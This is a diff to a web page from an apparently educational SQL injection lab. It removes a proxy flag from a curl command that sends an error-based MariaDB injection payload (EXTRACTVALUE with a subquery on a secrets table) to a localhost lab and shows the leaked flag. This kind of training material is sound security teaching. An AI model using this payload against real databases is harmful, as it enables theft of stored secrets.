@@ -95,7 +95,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mariadb/lab6" \<br> --data-urlencode "action=' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret_value FROM udf_secrets LIMIT 1))) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mariadb/lab6" \<br> --data-urlencode "action=' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret_value FROM udf_secrets LIMIT 1))) -- -"<br><br>
         <span class="prompt">Result: </span>MariaDB Error: XPATH syntax error: '~<strong>FLAG{ma_sys_3x3c_udf_rc3}</strong>'
     </div>
 </div>
